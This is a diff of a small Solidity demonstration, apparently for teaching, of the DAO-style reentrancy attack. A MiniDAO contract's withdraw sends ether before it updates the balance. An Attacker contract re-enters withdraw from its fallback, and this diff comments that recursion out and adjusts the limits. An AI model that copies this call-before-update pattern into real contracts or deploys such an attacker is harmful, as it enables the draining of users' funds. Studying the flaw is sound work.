@@ -9,6 +9,7 @@ contract MiniDAO {
 
     function withdraw(uint amount) {
         if(balances[msg.sender] < amount) throw;
+        //msg.sender.send(amount);
         msg.sender.call.value(amount)();
         balances[msg.sender] -= amount;
     }
@@ -18,13 +19,13 @@ contract Attacker {
 
     // limit the recursive calls to prevent out-of-gas error
     uint stack = 0;
-    uint constant stackLimit = 10;
+    uint constant stackLimit = 3;
     uint amount;
     MiniDAO dao;
 
     function Attacker(address daoAddress) public payable {
         dao = MiniDAO(daoAddress);
-        amount = msg.value;
+        amount = msg.value-6 ether;
         dao.deposit.value(msg.value)();
     }
 
@@ -32,9 +33,9 @@ contract Attacker {
         dao.withdraw(amount);
     }
 
-    function()payable {
-        if(stack++ < 10) {
-            dao.withdraw(amount);
-        }
+    function()public payable {
+        // if(stack++ < stackLimit) {
+        //     dao.withdraw(amount);
+        // }
     }
 }
